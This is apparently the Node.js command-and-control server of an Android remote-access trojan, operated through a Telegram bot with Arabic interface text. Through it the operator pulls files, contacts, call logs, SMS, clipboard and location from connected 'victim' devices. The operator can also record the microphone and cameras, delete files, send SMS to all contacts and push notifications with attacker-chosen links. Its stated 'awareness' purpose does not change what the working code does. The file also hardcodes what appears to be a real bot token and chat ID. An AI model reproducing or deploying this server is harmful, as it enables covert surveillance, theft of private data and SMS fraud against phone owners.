const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '8454161104:AAGkY24bDk6wKL7AvVs40V0zUSYib6WZ9jA'
const id = '7604667042'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تحميل الخادم بنجاح</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"});
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"});
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });

    appBot.sendMessage(id,
        `°• جهاز جديد متصل✅\n\n` +
        `•  طراز الجهاز📱 : <b>${model}</b>\n` +
        `• بطارية 🔋 : <b>${battery}</b>\n` +
        `• نسخة أندرويد : <b>${version}</b>\n` +
        `• سطوع الشاشة  : <b>${brightness}</b>\n` +
        `• نوع الشريحة SIM : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    );

    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• الجهاز غير متصل ❎\n\n` +
            `•  طراز الجهاز📱 : <b>${model}</b>\n` +
            `• بطارية 🔋 : <b>${battery}</b>\n` +
            `• نسخة أندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشة  : <b>${brightness}</b>\n` +
            `• نوع الشريحة SIM : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
            currentNumber = message.text;
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
                '• be careful that the message will not be sent if the number of characters in your message is more than allowed',
                {reply_markup: {force_reply: true}}
            );
        }

        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرسالة التي تريد إرسالها إلى هذا الرقم\'')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد حذف')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل الميكروفون فيها')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية فيها')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي فيها')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• • You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد أن تظهر كإشعار')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
                '• When the victim clicks on the notification, the link you are entering will be opened,',
                {reply_markup: {force_reply: true}}
            );
        }

        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• You will receive a response in the next few moments',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• • مرحبا بك في بوت اختراق 👋\n\n' +
                '• رجاء عدم استخدام البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n' +
                '• ترجمه البوت بقيادة ( @king_1_4 )  »طوفان الأقصى🏛️🇵🇸⁹\n\n' +
                '• قناتي تلجرا  t.me/Abu_Yamani\n\n' +
                '• اضغط هن( /start )  ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                        'resize_keyboard': true
                    }
                }
            );
        }

        if (message.text == 'الأجهزة المتصلة🤖') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا تتوفر أجهزة توصيل ❎\n\n' +
                    '• Make sure the application is installed on the target device'
                );
            } else {
                let text = '°• قائمة الأجهزة المتصلة🤖 :\n\n';
                appClients.forEach(function (value, key, map) {
                    text += `• طراز الجهاز📱 : <b>${value.model}</b>\n` +
                        `• بطارية 🔋 : <b>${value.battery}</b>\n` +
                        `• نسخة أندرويد : <b>${value.version}</b>\n` +
                        `• سطوع الشاشة  : <b>${value.brightness}</b>\n` +
                        `• نوع الشريحة SIM : <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, {parse_mode: "HTML"});
            }
        }

        if (message.text == 'قائمة الأوامر🛠') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا تتوفر أجهزة توصيل ❎\n\n' +
                    '• Make sure the application is installed on the target device'
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }]);
                });
                appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الثناء', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        appBot.sendMessage(id, '°• • تم رفض الإذن');
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const command = data.split(':')[0];
    const uuid = data.split(':')[1];
    console.log(uuid);

    if (command == 'device') {
        appBot.editMessageText(`°• حدد الجهاز لتنفيذ الثناء : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱تطبيقات', callback_data: `apps:${uuid}`},
                        {text: 'ℹ️معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '🗂️الحصول على ملف', callback_data: `file:${uuid}`},
                        {text: '📁حذف الملف', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📋حافظة', callback_data: `clipboard:${uuid}`},
                        {text: '🎤ميكروفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📷الكاميرا الرئيسية', callback_data: `camera_main:${uuid}`},
                        {text: '🤳كاميرا السيلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📍موقع', callback_data: `location:${uuid}`},
                        {text: '💬حمص ', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '📞مكالمات', callback_data: `calls:${uuid}`},
                        {text: '📒جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳يهتز ', callback_data: `vibrate:${uuid}`},
                        {text: '🔔إظهار الإشعار', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '✉️رسائل', callback_data: `messages:${uuid}`},
                        {text: '📨إرسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🔊تشغيل الصوت', callback_data: `play_audio:${uuid}`},
                        {text: '🔇إيقاف الصوت', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '📢إرسال رسالة إلى جميع جهات الاتصال ',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        });
    }

    // معالجة باقي الأوامر...
    if (command == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• You will receive a response in the next few moments',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🛠"]],
                    'resize_keyboard': true
                }
            }
        );
    }

    // ... باقي معالجات الأوامر بنفس النمط

    if (command == 'send_message') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id, '°• • يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إليه\n\n' +
            '• If you want to send SMS to local country numbers, you can enter the number with zero at the beginning, otherwise enter the number with the country code,',
            {reply_markup: {force_reply: true}});
        currentUuid = uuid;
    }

    if (command == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
            '• be careful that the message will not be sent if the number of characters in your message is more than allowed ,',
            {reply_markup: {force_reply: true}}
        );
        currentUuid = uuid;
    }

    if (command == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد تنزيله \n\n' +
            '• You do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to receive gallery files.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }

    if (command == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
            '• You do not need to enter the full file path, just enter the main path. For example, enter<b> DCIM/Camera </b> to delete gallery files.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }

    if (command == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل المدة التي تريد تسجيل الميكروفون فيها\n\n' +
            '• note that you must enter the time numerically in units of seconds ,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }

    if (command == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف\n\n' +
            '• toast is a short message that appears on the device screen for a few seconds ,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }

    if (command == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
            '• Your message will appear in the target device status bar like regular notification',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }

    if (command == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• note that you must enter the direct link of the required sound, otherwise the sound will not be played ,',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try {
        axios.get(address).then(r => "");
    } catch (e) {
    }
}, 5000);

appServer.listen(process.env.PORT || 8999);
